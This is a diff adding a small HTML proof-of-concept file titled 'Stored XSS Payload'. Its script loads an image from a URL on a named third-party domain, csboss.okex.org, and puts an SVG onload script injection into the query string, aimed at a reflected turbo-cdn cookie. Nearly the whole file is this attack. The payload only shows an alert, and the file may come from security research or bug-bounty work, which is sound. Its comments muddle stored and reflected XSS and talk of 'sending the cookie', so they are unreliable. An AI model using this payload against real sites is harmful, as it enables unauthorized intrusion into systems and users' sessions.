@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stored XSS Payload</title>
+</head>
+<body>
+    <script>
+        // Create a new Image object to send the cookie with the XSS payload
+        var img = new Image();
+
+        // Set the source to a URL that reflects the XSS payload in the turbo-cdn cookie
+        img.src = 'https://csboss.okex.org/newboss/home?turbo-cdn=<svg/onload=alert(1)>';
+
+        // Append the image to the document (optional)
+        document.body.appendChild(img);
+    </script>
+</body>
+</html>
